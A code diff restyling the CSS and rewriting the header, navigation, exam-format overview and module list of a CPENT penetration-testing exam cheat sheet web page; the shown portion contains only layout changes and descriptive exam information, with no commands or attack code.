@@ -144,146 +144,146 @@
 <meta name="twitter:image" content="https://sarathg.me/assets/og/cpent-cheatsheet.png" />
 <link rel="stylesheet" href="/assets/fonts/gf/fraunces-ibm-plex-mono-plus-jakarta-sans-7a6348.css">
 <style>
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+*, *::before, *::after { box-sizing:border-box; margin:0; padding:0; }
 :root {
-  --bg:#0d0f14; --surface:#14171f; --surface2:#1b2029;
-  --border:#242a35; --border2:#2e3644;
-  --red:#ff4d5e; --green:#42d97a; --amber:#f5b942; --blue:#5b9cf6; --teal:#3ecfcf; --purple:#a78bfa;
-  --text:#e6ecf5; --text2:#8a99ad; --text3:#4a5566;
+  --bg:#17191e; --surface:#1d2027; --surface2:#22262e;
+  --border:#2c3038; --hair:#262a31;
+  --text:#e7e9ee; --text2:#a5abb6; --text3:#727884;
+  --accent:#e2685f; --accent-soft:rgba(226,104,95,.13); --accent-line:rgba(226,104,95,.4);
+  --code-bg:#121419; --code-text:#d3d8e0; --code-dim:#6a7280; --code-accent:#e2857c;
   --mono:'IBM Plex Mono',monospace; --serif:'Fraunces',serif; --sans:'Plus Jakarta Sans',sans-serif;
+  --measure:70ch;
 }
-body { font-family:var(--sans); background:var(--bg); color:var(--text); line-height:1.75; font-size:16px; }
+html { scroll-behavior:smooth; }
+body { font-family:var(--sans); background:var(--bg); color:var(--text); line-height:1.72; font-size:16.5px; -webkit-font-smoothing:antialiased; }
+::selection { background:var(--accent-soft); }
+* { scrollbar-color:var(--border) transparent; }
 
-.hero { background:var(--surface); border-bottom:1px solid var(--border); padding:80px 0 60px; position:relative; overflow:hidden; }
-.hero::before { content:''; position:absolute; inset:0; background:radial-gradient(ellipse 55% 70% at 0% 45%,rgba(255,77,94,.10) 0%,transparent 62%),radial-gradient(ellipse 40% 55% at 100% 15%,rgba(167,139,250,.07) 0%,transparent 55%); pointer-events:none; }
-.wrap { max-width:900px; margin:0 auto; padding:0 40px; position:relative; z-index:1; }
-.hero-eyebrow { font-family:var(--mono); font-size:12px; font-weight:500; color:var(--red); letter-spacing:.1em; text-transform:uppercase; margin-bottom:22px; display:flex; align-items:center; gap:10px; }
-.hero-eyebrow::before { content:''; width:24px; height:1px; background:var(--red); }
-h1.hero-title { font-family:var(--serif); font-size:clamp(38px,6vw,62px); font-weight:700; line-height:1.08; color:var(--text); margin-bottom:20px; letter-spacing:-.02em; }
-h1.hero-title em { font-style:italic; color:var(--red); font-weight:300; }
-.hero-desc { font-size:17px; color:var(--text2); max-width:610px; line-height:1.7; margin-bottom:34px; }
-.hero-tags { display:flex; gap:10px; flex-wrap:wrap; }
-.hero-tag { font-family:var(--mono); font-size:11px; font-weight:500; padding:5px 14px; border-radius:6px; display:flex; align-items:center; gap:7px; }
-.ht-r { background:rgba(255,77,94,.1); color:var(--red); border:1px solid rgba(255,77,94,.22); }
-.ht-o { background:rgba(245,185,66,.1); color:var(--amber); border:1px solid rgba(245,185,66,.2); }
-.ht-g { background:rgba(66,217,122,.1); color:var(--green); border:1px solid rgba(66,217,122,.2); }
-.ht-b { background:rgba(91,156,246,.1); color:var(--blue); border:1px solid rgba(91,156,246,.2); }
-.hero-byline { margin-top:30px; font-size:14px; color:var(--text2); display:flex; align-items:center; gap:10px; flex-wrap:wrap; }
-.hero-byline b { color:var(--text); font-weight:600; }
-.hero-byline .cred { font-family:var(--mono); font-size:10.5px; font-weight:600; color:var(--red); background:rgba(255,77,94,.09); border:1px solid rgba(255,77,94,.22); padding:3px 9px; border-radius:5px; letter-spacing:.03em; }
+.wrap { max-width:820px; margin:0 auto; padding:0 28px; }
 
-.nav { position:sticky; top:64px; z-index:200; background:rgba(13,15,20,.95); backdrop-filter:blur(12px); border-bottom:1px solid var(--border); }
-.nav-inner { max-width:900px; margin:0 auto; padding:0 40px; display:flex; overflow-x:auto; scrollbar-width:none; gap:2px; }
-.nav-inner::-webkit-scrollbar { display:none; }
-.nav-btn { font-family:var(--mono); font-size:11px; font-weight:600; color:var(--text3); padding:15px 15px; cursor:pointer; white-space:nowrap; user-select:none; border:none; border-bottom:2px solid transparent; background:none; transition:color .15s,border-color .15s; letter-spacing:.03em; }
-.nav-btn:hover { color:var(--text2); }
-.nav-btn.on { color:var(--red); border-bottom-color:var(--red); }
+/* HERO */
+.hero { padding:88px 0 46px; border-bottom:1px solid var(--hair); }
+.hero .lede { font-family:var(--mono); font-size:12.5px; letter-spacing:.02em; color:var(--accent); margin-bottom:26px; }
+h1 { font-family:var(--serif); font-size:clamp(36px,5.4vw,54px); font-weight:600; line-height:1.1; letter-spacing:-.02em; margin-bottom:22px; }
+.hero-desc { font-size:18px; color:var(--text2); max-width:60ch; line-height:1.66; }
+.hero-meta { margin-top:30px; font-size:14.5px; color:var(--text3); display:flex; flex-wrap:wrap; align-items:baseline; gap:8px 14px; }
+.hero-meta b { color:var(--text); font-weight:600; }
+.hero-meta .sep { color:var(--border); }
 
-.content { max-width:900px; margin:0 auto; padding:60px 40px 100px; }
-.sec { margin-bottom:82px; scroll-margin-top:120px; }
-.sec-eyebrow { font-family:var(--mono); font-size:11px; font-weight:600; color:var(--text3); letter-spacing:.14em; text-transform:uppercase; margin-bottom:10px; }
-h2.sec-title { font-family:var(--serif); font-size:33px; font-weight:700; color:var(--text); letter-spacing:-.02em; line-height:1.15; margin-bottom:8px; display:flex; align-items:center; gap:16px; }
-.sec-num { font-family:var(--mono); font-size:13px; font-weight:600; color:var(--red); background:rgba(255,77,94,.1); border:1px solid rgba(255,77,94,.22); width:36px; height:36px; border-radius:10px; display:inline-flex; align-items:center; justify-content:center; flex-shrink:0; }
-.sec-divider { height:1px; background:var(--border); margin:20px 0 30px; }
-p { color:var(--text2); margin-bottom:14px; font-size:15.5px; }
+/* STICKY CONTENTS NAV */
+.toc { position:sticky; top:64px; z-index:150; background:rgba(23,25,30,.92); backdrop-filter:blur(10px); border-bottom:1px solid var(--hair); }
+.toc-inner { max-width:820px; margin:0 auto; padding:0 28px; display:flex; gap:4px; overflow-x:auto; scrollbar-width:none; }
+.toc-inner::-webkit-scrollbar { display:none; }
+.toc a { font-size:12.5px; font-weight:500; color:var(--text3); padding:13px 11px; white-space:nowrap; text-decoration:none; border-bottom:2px solid transparent; transition:color .15s,border-color .15s; }
+.toc a:hover { color:var(--text2); }
+.toc a.on { color:var(--text); border-bottom-color:var(--accent); }
+
+/* SECTIONS */
+main { padding-bottom:96px; }
+.sec { padding:52px 0; border-bottom:1px solid var(--hair); scroll-margin-top:112px; }
+.sec:last-of-type { border-bottom:none; }
+.sec-h { display:flex; align-items:baseline; gap:14px; margin-bottom:8px; }
+.sec-h .n { font-family:var(--mono); font-size:13px; font-weight:500; color:var(--text3); }
+h2 { font-family:var(--serif); font-size:29px; font-weight:600; letter-spacing:-.015em; line-height:1.2; }
+h3 { font-family:var(--serif); font-size:20px; font-weight:600; letter-spacing:-.01em; margin:30px 0 10px; }
+.sec > p, .sec > ul, .sec > ol { max-width:var(--measure); }
+p { color:var(--text2); margin-bottom:15px; font-size:16.5px; }
 p strong { color:var(--text); font-weight:600; }
-ul,ol { padding-left:22px; color:var(--text2); margin-bottom:16px; font-size:15.5px; }
-li { margin-bottom:7px; }
-ul li::marker { color:var(--red); }
-ol li::marker { color:var(--red); font-family:var(--mono); font-weight:600; }
-a.inl { color:var(--red); text-decoration:none; border-bottom:1px solid rgba(255,77,94,.35); }
-a.inl:hover { border-bottom-color:var(--red); }
+a.inl { color:var(--accent); text-decoration:none; border-bottom:1px solid var(--accent-line); }
+a.inl:hover { border-bottom-color:var(--accent); }
+ul, ol { padding-left:20px; color:var(--text2); margin-bottom:16px; }
+li { margin-bottom:8px; padding-left:4px; }
+li::marker { color:var(--text3); }
+.lead-in { font-size:18px; color:var(--text2); }
 
-/* SPEC CARD */
-.spec { background:var(--surface); border:1px solid var(--border2); border-radius:16px; padding:8px 8px; margin:26px 0; display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:2px; overflow:hidden; }
-.spec-cell { padding:20px 22px; }
-.spec-cell .k { font-family:var(--mono); font-size:10px; font-weight:600; letter-spacing:.1em; text-transform:uppercase; color:var(--text3); margin-bottom:8px; }
-.spec-cell .v { font-family:var(--serif); font-size:23px; font-weight:700; color:var(--text); line-height:1.2; letter-spacing:-.01em; }
-.spec-cell .v small { display:block; font-family:var(--sans); font-size:12.5px; font-weight:400; color:var(--text2); margin-top:5px; letter-spacing:0; }
-.spec-cell .v em { font-style:normal; color:var(--red); }
+/* PART LABEL */
+.part { font-family:var(--mono); font-size:11.5px; font-weight:500; letter-spacing:.16em; text-transform:uppercase; color:var(--text3); padding:44px 0 0; }
 
-/* MODULE GRID */
-.mods { display:grid; grid-template-columns:repeat(auto-fill,minmax(250px,1fr)); gap:10px; margin:24px 0; }
-.mod { display:flex; gap:13px; align-items:flex-start; background:var(--surface); border:1px solid var(--border); border-radius:11px; padding:14px 16px; }
-.mod .n { font-family:var(--mono); font-size:12px; font-weight:700; color:var(--red); flex-shrink:0; min-width:20px; }
-.mod .t { font-size:14px; font-weight:600; color:var(--text); line-height:1.4; }
-.mod .t span { display:block; font-family:var(--mono); font-size:10.5px; font-weight:500; color:var(--text3); margin-top:3px; }
+/* SPEC LIST */
+.spec { border:1px solid var(--border); border-radius:12px; margin:26px 0; overflow:hidden; }
+.spec-row { display:grid; grid-template-columns:150px 1fr; gap:18px; padding:15px 22px; border-bottom:1px solid var(--hair); align-items:baseline; }
+.spec-row:last-child { border-bottom:none; }
+.spec-row .k { font-family:var(--mono); font-size:11.5px; letter-spacing:.08em; text-transform:uppercase; color:var(--text3); }
+.spec-row .v { font-size:16px; color:var(--text); }
+.spec-row .v .big { font-family:var(--serif); font-size:20px; font-weight:600; color:var(--accent); margin-right:8px; }
+.spec-row .v small { color:var(--text2); font-size:14.5px; }
 
-/* CALLOUT (h4h) */
-.callout { background:linear-gradient(135deg,rgba(255,77,94,.06),rgba(167,139,250,.05)); border:1px solid var(--border2); border-radius:18px; padding:30px 32px; margin:26px 0; position:relative; overflow:hidden; }
-.callout::before { content:''; position:absolute; top:0; left:0; width:4px; height:100%; background:linear-gradient(180deg,var(--red),var(--purple)); }
-.callout-tag { font-family:var(--mono); font-size:11px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; color:var(--red); margin-bottom:12px; display:flex; align-items:center; gap:9px; }
-.callout h3 { font-family:var(--serif); font-size:25px; font-weight:700; color:var(--text); letter-spacing:-.015em; line-height:1.2; margin-bottom:12px; }
-.callout p { font-size:15px; }
-.h4h-stats { display:flex; gap:26px; flex-wrap:wrap; margin:22px 0 6px; }
-.h4h-stat .num { font-family:var(--serif); font-size:26px; font-weight:700; color:var(--red); line-height:1; }
-.h4h-stat .lbl { font-family:var(--mono); font-size:10.5px; color:var(--text3); margin-top:6px; letter-spacing:.02em; }
+/* MODULE LIST */
+.mods { list-style:none; padding:0; margin:24px 0; display:grid; grid-template-columns:1fr 1fr; gap:0 40px; }
+.mods li { display:grid; grid-template-columns:24px 1fr; gap:12px; padding:12px 0; border-top:1px solid var(--hair); margin:0; }
+.mods li .mn { font-family:var(--mono); font-size:12.5px; color:var(--text3); padding-top:1px; }
+.mods li .mt { font-size:15.5px; color:var(--text); font-weight:500; line-height:1.4; }
+.mods li .mt span { display:block; font-size:13.5px; color:var(--text3); font-weight:400; margin-top:2px; }
+
+/* CALLOUT */
+.callout { border:1px solid var(--border); border-radius:12px; padding:18px 22px; margin:22px 0; background:var(--surface); }
+.callout .cl-label { font-family:var(--mono); font-size:11px; letter-spacing:.1em; text-transform:uppercase; color:var(--text3); margin-bottom:8px; }
+.callout p { margin:0; font-size:15.5px; color:var(--text2); }
+.callout p + p { margin-top:8px; }
+.callout.key { border-color:var(--accent-line); }
+.callout.key .cl-label { color:var(--accent); }
+.callout ul { margin:8px 0 0; }
+.callout li { font-size:15px; }
+
+/* H4H PANEL */
+.panel { border:1px solid var(--border); border-radius:14px; padding:28px 26px; margin:24px 0; }
+.panel h3 { margin-top:0; font-size:22px; }
+.panel .figs { display:flex; flex-wrap:wrap; gap:28px 34px; margin-top:22px; padding-top:20px; border-top:1px solid var(--hair); }
+.panel .fig .num { font-family:var(--serif); font-size:25px; font-weight:600; color:var(--accent); line-height:1; }
+.panel .fig .lbl { font-size:13px; color:var(--text3); margin-top:6px; }
 
 /* TABLES */
-.tbl-wrap { overflow-x:auto; margin:18px 0; border-radius:12px; border:1px solid var(--border2); }
-table { width:100%; border-collapse:collapse; font-size:14px; }
-th { background:var(--surface2); color:var(--text); font-size:10.5px; text-transform:uppercase; letter-spacing:.05em; font-weight:700; padding:11px 16px; border-bottom:1px solid var(--border2); text-align:left; }
-td { padding:11px 16px; border-bottom:1px solid var(--border); color:var(--text2); vertical-align:top; }
+.tbl-wrap { overflow-x:auto; margin:22px 0; }
+table { width:100%; border-collapse:collapse; font-size:15px; }
+th { text-align:left; font-family:var(--mono); font-size:11px; font-weight:500; letter-spacing:.07em; text-transform:uppercase; color:var(--text3); padding:0 18px 10px 0; border-bottom:1px solid var(--border); }
+td { padding:13px 18px 13px 0; border-bottom:1px solid var(--hair); color:var(--text2); vertical-align:top; line-height:1.6; }
 tr:last-child td { border-bottom:none; }
-tr:nth-child(even) td { background:rgba(255,255,255,.015); }
-td code, td .cmd { font-family:var(--mono); font-size:12px; color:var(--teal); }
+td:first-child { color:var(--text); font-weight:500; white-space:nowrap; }
+td .mono, th.mono, td.mono { font-family:var(--mono); font-size:13px; color:var(--accent); font-weight:400; }
 
-/* CODE BLOCKS */
-.cb { border-radius:12px; overflow:hidden; margin:16px 0; border:1px solid var(--border2); }
-.cb-top { display:flex; align-items:center; justify-content:space-between; padding:9px 16px; background:var(--surface2); border-bottom:1px solid var(--border); }
-.cb-lang { font-family:var(--mono); font-size:10px; font-weight:600; display:flex; align-items:center; gap:8px; letter-spacing:.04em; color:var(--text2); }
-.dot { width:7px; height:7px; border-radius:50%; }
-.d-kali { background:#f47068; } .d-tgt { background:#5b9cf6; } .d-win { background:#3ecfcf; } .d-note { background:#f5b942; }
-.cp-btn { font-family:var(--mono); font-size:10px; font-weight:600; background:none; border:1px solid var(--border2); color:var(--text3); padding:4px 12px; border-radius:6px; cursor:pointer; transition:all .15s; }
-.cp-btn:hover { background:var(--border); color:var(--text2); }
-.cp-btn.ok { color:var(--green); border-color:rgba(66,217,122,.4); }
-pre { background:#070a0f; font-family:var(--mono); font-size:12.5px; line-height:1.85; padding:18px 20px; overflow-x:auto; color:var(--text); }
-.cm { color:var(--text3); font-style:italic; }
-.pr { color:var(--red); }
+/* CODE */
+.code { margin:20px 0; border:1px solid var(--border); border-radius:12px; overflow:hidden; background:var(--code-bg); }
+.code-top { display:flex; align-items:center; justify-content:space-between; padding:10px 16px; border-bottom:1px solid rgba(255,255,255,.05); }
+.code-label { font-family:var(--mono); font-size:11px; letter-spacing:.06em; color:var(--code-dim); }
+.copy { font-family:var(--mono); font-size:11px; color:var(--code-dim); background:none; border:1px solid transparent; padding:3px 8px; border-radius:6px; cursor:pointer; transition:color .15s,background .15s; }
+.copy:hover { color:var(--code-text); background:rgba(255,255,255,.05); }
+.copy.ok { color:var(--accent); }
+pre { font-family:var(--mono); font-size:13px; line-height:1.85; padding:18px 18px; overflow-x:auto; color:var(--code-text); }
+.cm { color:var(--code-dim); }
+.pr { color:var(--code-accent); }
+code { font-family:var(--mono); font-size:13.5px; background:var(--surface2); color:var(--text); padding:1px 6px; border-radius:5px; }
 
-code { font-family:var(--mono); font-size:12.5px; background:rgba(255,77,94,.09); color:var(--red); padding:2px 6px; border-radius:4px; }
+/* RELATED */
+.related { border-top:1px solid var(--hair); padding:44px 0 8px; }
+.related .rl-label { font-family:var(--mono); font-size:11.5px; letter-spacing:.14em; text-transform:uppercase; color:var(--text3); margin-bottom:20px; }
+.related ul { list-style:none; padding:0; margin:0; display:grid; grid-template-columns:1fr 1fr; gap:18px 34px; }
+.related li { margin:0; padding:0; }
+.related li a { color:var(--text); font-weight:600; font-size:16px; text-decoration:none; border:none; }
+.related li a:hover { color:var(--accent); }
+.related li span { display:block; color:var(--text3); font-size:14px; margin-top:3px; font-weight:400; }
+.related .foot { margin-top:26px; padding-top:18px; border-top:1px solid var(--hair); font-size:14.5px; color:var(--text3); }
+.related .foot a { color:var(--accent); text-decoration:none; font-weight:600; }
+.related .foot a:hover { text-decoration:underline; }
 
-/* NOTES */
-.note { display:flex; gap:14px; padding:16px 18px; border-radius:10px; margin:18px 0; border-left:3px solid; }
-.note-icon { font-size:16px; flex-shrink:0; margin-top:2px; }
-.note-body { flex:1; }
-.note-title { font-size:13px; font-weight:700; margin-bottom:4px; }
-.note p { font-size:13.5px; margin:0; line-height:1.65; }
-.note p+p { margin-top:6px; }
-.n-info { background:rgba(91,156,246,.06); border-color:var(--blue); } .n-info .note-title { color:var(--blue); }
-.n-ok   { background:rgba(66,217,122,.06); border-color:var(--green); } .n-ok .note-title   { color:var(--green); }
-.n-warn { background:rgba(245,185,66,.06); border-color:var(--amber); } .n-warn .note-title { color:var(--amber); }
-.n-crit { background:rgba(255,77,94,.06);  border-color:var(--red); }   .n-crit .note-title { color:var(--red); }
-
-.part-label { font-family:var(--mono); font-size:11px; font-weight:700; letter-spacing:.1em; text-transform:uppercase; color:var(--text3); display:flex; align-items:center; gap:14px; margin:56px 0 8px; }
-.part-label::before { content:''; width:22px; height:1px; background:var(--red); }
-.part-label::after { content:''; flex:1; height:1px; background:var(--border); }
-
-.faq-item { border-top:1px solid var(--border); padding:22px 0 8px; }
-.faq-item h3 { font-family:var(--serif); font-size:20px; font-weight:600; color:var(--text); letter-spacing:-.01em; line-height:1.3; margin-bottom:10px; }
-.faq-item code { font-family:var(--mono); font-size:13px; }
-
-.footer { border-top:1px solid var(--border); padding:36px 40px; text-align:center; font-family:var(--mono); font-size:11px; color:var(--text3); letter-spacing:.04em; }
-
-@media(max-width:640px) {
-  .wrap,.content{padding-left:20px;padding-right:20px;}
-  h2.sec-title{font-size:27px;}
-  .callout{padding:24px 22px;}
+@media(max-width:680px){
+  .wrap{padding:0 20px;} .toc-inner{padding:0 20px;}
+  .mods{grid-template-columns:1fr;} .related ul{grid-template-columns:1fr;}
+  .spec-row{grid-template-columns:1fr; gap:5px;}
+  h2{font-size:25px;} .hero{padding:64px 0 40px;}
 }
 </style>
 <style id="sg-theme">
-/* Second theme, driven by navbar.js toggling html.light. Absent class = dark, the site default. */
+/* Light theme: navbar.js toggles html.light. Absent = dark (site default). */
 html.light{
-  --bg:#f5f7fa; --surface:#ffffff; --surface2:#eef1f6;
-  --border:#dde3ec; --border2:#c6cfdc;
-  --red:#d92d3f; --green:#1f9d55; --amber:#b7791f; --blue:#2f6fd6; --teal:#158a8a; --purple:#7c5ccf;
-  --text:#101826; --text2:#4a5a72; --text3:#8593a8;
+  --bg:#faf9f7; --surface:#ffffff; --surface2:#f1efeb;
+  --border:#e3e0da; --hair:#ece9e3;
+  --text:#1a1c21; --text2:#565d68; --text3:#8b909a;
+  --accent:#c8443c; --accent-soft:rgba(200,68,60,.1); --accent-line:rgba(200,68,60,.35);
+  --code-bg:#1b1e24; --code-text:#d8dce3; --code-dim:#7a828f; --code-accent:#e2857c;
 }
-html.light .nav{background:rgba(245,247,250,.95)}
-html.light pre{background:#0d1420;color:#e6ecf5}
-html.light pre .pr{color:#ff8a95}
-html.light pre .cm{color:#7286a3}
-html.light td code, html.light td .cmd{color:#0f7d7d}
+html.light .toc{background:rgba(250,249,247,.92);}
+html.light code{background:#f1efeb;color:#1a1c21;}
+html.light .copy:hover{background:rgba(255,255,255,.08);}
 </style>
 <!-- Microsoft Clarity -->
 <script type="text/javascript">
@@ -298,186 +298,148 @@ html.light td code, html.light td .cmd{color:#0f7d7d}
 <script src="navbar.js" defer></script>
 
 <main>
-<div class="hero">
+<header class="hero">
   <div class="wrap">
-    <div class="hero-eyebrow">CPENT / LPT Field Reference</div>
-    <h1 class="hero-title">CPENT cheat sheet:<br>the 24-hour exam, <em>mapped</em></h1>
-    <p class="hero-desc">The EC-Council CPENT AI exam is 24 hours on a live cyber range, chained end to end. This is the reference I wish I had open on the second monitor: the format and scoring, the 14 modules, a time plan that survives contact with the range, and the commands that matter, from first Nmap to final report.</p>
-    <div class="hero-tags">
-      <span class="hero-tag ht-r">⏱️ 24-hour live range</span>
-      <span class="hero-tag ht-o">🎯 70% CPENT · 90% LPT</span>
-      <span class="hero-tag ht-g">⌨️ Command references</span>
-      <span class="hero-tag ht-b">📄 Report scored too</span>
-    </div>
-    <div class="hero-byline">
-      Written by <b>Sarath G</b>
-      <span class="cred">CPENT</span><span class="cred">LPT&nbsp;Master</span>
-      <span style="color:var(--text3)">·</span> 9+ years offensive security &amp; training
-    </div>
+    <p class="lede">CPENT / LPT field reference</p>
+    <h1>CPENT cheat sheet: the 24-hour exam, mapped</h1>
+    <p class="hero-desc">The EC-Council CPENT AI exam is 24 hours on a live cyber range, chained end to end. This is the reference to keep open on a second screen: the format and scoring, the 14 modules, a time plan that survives contact with the range, and the commands that matter, from first Nmap to final report.</p>
+    <p class="hero-meta">
+      <b>Sarath G</b> <span class="sep">/</span> CPENT and LPT Master <span class="sep">/</span> 9+ years in offensive security and training
+    </p>
   </div>
-</div>
+</header>
 
-<nav class="nav">
-  <div class="nav-inner">
-    <button class="nav-btn on" onclick="gotoSec(this,'s1')">01 · Exam</button>
-    <button class="nav-btn" onclick="gotoSec(this,'s2')">02 · Modules</button>
-    <button class="nav-btn" onclick="gotoSec(this,'s3')">03 · Hackers 4 Humanity</button>
-    <button class="nav-btn" onclick="gotoSec(this,'s4')">04 · 24h plan</button>
-    <button class="nav-btn" onclick="gotoSec(this,'s5')">05 · Recon &amp; OSINT</button>
-    <button class="nav-btn" onclick="gotoSec(this,'s6')">06 · Network</button>
-    <button class="nav-btn" onclick="gotoSec(this,'s7')">07 · Web &amp; API</button>
-    <button class="nav-btn" onclick="gotoSec(this,'s8')">08 · AD &amp; Windows</button>
-    <button class="nav-btn" onclick="gotoSec(this,'s9')">09 · Linux</button>
-    <button class="nav-btn" onclick="gotoSec(this,'s10')">10 · Pivoting</button>
-    <button class="nav-btn" onclick="gotoSec(this,'s11')">11 · Binaries</button>
-    <button class="nav-btn" onclick="gotoSec(this,'s12')">12 · IoT &amp; OT</button>
-    <button class="nav-btn" onclick="gotoSec(this,'s13')">13 · Report</button>
-    <button class="nav-btn" onclick="gotoSec(this,'s14')">14 · FAQ</button>
+<nav class="toc" aria-label="Contents">
+  <div class="toc-inner">
+    <a href="#s1" class="on">Exam</a>
+    <a href="#s2">Modules</a>
+    <a href="#s3">Hackers 4 Humanity</a>
+    <a href="#s4">24-hour plan</a>
+    <a href="#s5">Recon</a>
+    <a href="#s6">Network</a>
+    <a href="#s7">Web &amp; API</a>
+    <a href="#s8">AD &amp; Windows</a>
+    <a href="#s9">Linux</a>
+    <a href="#s10">Pivoting</a>
+    <a href="#s11">Binaries</a>
+    <a href="#s12">IoT &amp; OT</a>
+    <a href="#s13">Report</a>
+    <a href="#s14">FAQ</a>
   </div>
 </nav>
 
-<div class="content">
+<div class="wrap">
 
-<!-- 01 EXAM -->
-<div class="sec" id="s1">
-  <div class="sec-eyebrow">Section 01</div>
-  <h2 class="sec-title"><span class="sec-num">01</span> The exam at a glance</h2>
-  <div class="sec-divider"></div>
-  <p>CPENT is not a multiple-choice test. It is a <strong>100% practical, performance-based exam</strong> on a live enterprise range, remote-proctored, and it is chained: footholds unlock networks you could not previously see. You may use your own notes and tools. That is exactly why a cheat sheet earns its place. Against a 24-hour clock, recall speed is a score.</p>
+<!-- 01 -->
+<section class="sec" id="s1">
+  <div class="sec-h"><span class="n">01</span><h2>The exam at a glance</h2></div>
+  <p class="lead-in">CPENT is not a multiple-choice test. It is a fully practical exam on a live enterprise range, remote-proctored, and chained: footholds unlock networks you could not previously see. You may use your own notes and tools, which is exactly why a cheat sheet earns its place. Against a 24-hour clock, recall speed is a score.</p>
   <div class="spec">
-    <div class="spec-cell"><div class="k">Format</div><div class="v">Live range<small>100% practical, remote-proctored</small></div></div>
-    <div class="spec-cell"><div class="k">Duration</div><div class="v">24 hours<small>One session, or two of 12h</small></div></div>
-    <div class="spec-cell"><div class="k">CPENT pass</div><div class="v"><em>70%+</em><small>Earns the CPENT certification</small></div></div>
-    <div class="spec-cell"><div class="k">LPT Master</div><div class="v"><em>90%+</em><small>Licensed Penetration Tester</small></div></div>
-    <div class="spec-cell"><div class="k">Report</div><div class="v">7 days<small>Submitted after final session, scored</small></div></div>
-    <div class="spec-cell"><div class="k">Modules</div><div class="v">14<small>Recon to report, full kill chain</small></div></div>
+    <div class="spec-row"><div class="k">Format</div><div class="v">Live cyber range <small>&mdash; 100% practical, remote-proctored</small></div></div>
+    <div class="spec-row"><div class="k">Duration</div><div class="v">24 hours <small>&mdash; one session, or two of 12 hours</small></div></div>
+    <div class="spec-row"><div class="k">CPENT pass</div><div class="v"><span class="big">70%+</span><small>earns the CPENT certification</small></div></div>
+    <div class="spec-row"><div class="k">LPT Master</div><div class="v"><span class="big">90%+</span><small>Licensed Penetration Tester</small></div></div>
+    <div class="spec-row"><div class="k">Report</div><div class="v">Within 7 days <small>&mdash; submitted after the final session, and scored</small></div></div>
+    <div class="spec-row"><div class="k">Modules</div><div class="v">14 <small>&mdash; recon to report, the full kill chain</small></div></div>
   </div>
-  <div class="note n-info">
-    <div class="note-icon">🤖</div>
-    <div class="note-body"><div class="note-title">"CPENT AI" is the current version</div>
-      <p>The program is now branded <strong>CPENT AI</strong>. Same 24-hour range and same LPT Master pathway, plus AI-assisted techniques mapped across the phases: AI for reconnaissance, vulnerability analysis and exploit suggestion, AD enumeration and API recon. The underlying skills the range grades, network, AD, web, pivoting, binaries and reporting, are unchanged. Treat AI as an accelerator on top of everything below, not a replacement for it.</p>
-    </div>
+  <p><strong>&ldquo;CPENT AI&rdquo; is the current version.</strong> Same 24-hour range and the same LPT Master pathway, plus AI-assisted techniques mapped across the phases: AI for reconnaissance, vulnerability analysis and exploit suggestion, Active Directory enumeration and API recon. The skills the range grades are unchanged. Treat AI as an accelerator on top of everything below, not a replacement for it.</p>
+  <div class="callout key">
+    <div class="cl-label">The report counts</div>
+    <p>Rooting a box you cannot document earns you nothing. Screenshot every step, flag and proof as you go, with the command visible in frame. A candidate who reaches 90% on the range but writes a weak report can still drop below the LPT line. <a class="inl" href="#s13">Report writing is Section 13.</a></p>
   </div>
-  <div class="note n-crit">
-    <div class="note-icon">📄</div>
-    <div class="note-body"><div class="note-title">The report is part of the score</div>
-      <p>Rooting a box you cannot document earns you nothing. Screenshot every step, every flag and every proof as you go, with the command visible in frame. See <a class="inl" href="#s13">Section 13</a>. A candidate who hits 90% on the range but writes a weak report can drop below the LPT line.</p>
-    </div>
-  </div>
-</div>
+</section>
 
-<!-- 02 MODULES -->
-<div class="sec" id="s2">
-  <div class="sec-eyebrow">Section 02</div>
-  <h2 class="sec-title"><span class="sec-num">02</span> The 14 CPENT AI modules</h2>
-  <div class="sec-divider"></div>
-  <p>The official curriculum, in order. This cheat sheet groups them into the sections that follow, but keep the module list in mind: it is the map of what the range can throw at you.</p>
-  <div class="mods">
-    <div class="mod"><span class="n">01</span><div class="t">Introduction to Penetration Testing &amp; Methodologies<span>Frameworks, PTES, scoping mindset</span></div></div>
-    <div class="mod"><span class="n">02</span><div class="t">Penetration Testing Scoping &amp; Engagement<span>Rules of engagement, legal, scope</span></div></div>
-    <div class="mod"><span class="n">03</span><div class="t">Open-Source Intelligence (OSINT)<span>Passive recon, footprinting</span></div></div>
-    <div class="mod"><span class="n">04</span><div class="t">Social Engineering Penetration Testing<span>Pretext, phishing, human layer</span></div></div>
-    <div class="mod"><span class="n">05</span><div class="t">Web Application Penetration Testing<span>OWASP, injection, auth flaws</span></div></div>
-    <div class="mod"><span class="n">06</span><div class="t">API &amp; Java Web Token Penetration Testing<span>BOLA/IDOR, JWT attacks</span></div></div>
-    <div class="mod"><span class="n">07</span><div class="t">Perimeter Defense Evasion Techniques<span>Firewall, IDS/IPS, WAF bypass</span></div></div>
-    <div class="mod"><span class="n">08</span><div class="t">Windows Exploitation &amp; Privilege Escalation<span>Tokens, services, misconfig</span></div></div>
-    <div class="mod"><span class="n">09</span><div class="t">Active Directory Penetration Testing<span>Kerberos, ACLs, DCSync</span></div></div>
-    <div class="mod"><span class="n">10</span><div class="t">Linux Exploitation &amp; Privilege Escalation<span>SUID, sudo, capabilities, cron</span></div></div>
-    <div class="mod"><span class="n">11</span><div class="t">Reverse Engineering, Fuzzing &amp; Binary Exploitation<span>Stack overflows, 32 &amp; 64-bit</span></div></div>
-    <div class="mod"><span class="n">12</span><div class="t">Lateral Movement &amp; Pivoting<span>Tunnels, double pivot, hidden nets</span></div></div>
-    <div class="mod"><span class="n">13</span><div class="t">IoT Penetration Testing<span>Firmware, protocols, hardware</span></div></div>
-    <div class="mod"><span class="n">14</span><div class="t">Report Writing &amp; Post-Testing Actions<span>Findings, PoC, remediation</span></div></div>
-  </div>
-  <div class="note n-info">
-    <div class="note-icon">🧭</div>
-    <div class="note-body"><div class="note-title">Where OT, cloud and wireless live</div>
-      <p>The CPENT AI syllabus folds operational technology, wireless and perimeter work into the modules above and the range challenges, rather than listing every one as a standalone chapter. OT/SCADA testing is an advanced range skill, covered in <a class="inl" href="#s12">Section 12</a>. Do not assume a topic is out of scope just because it is not a numbered module title.</p>
-    </div>
-  </div>
-</div>
+<!-- 02 -->
+<section class="sec" id="s2">
+  <div class="sec-h"><span class="n">02</span><h2>The 14 CPENT AI modules</h2></div>
+  <p>The official curriculum, in order. This cheat sheet groups them into the sections that follow, but keep the list in mind: it is the map of what the range can throw at you.</p>
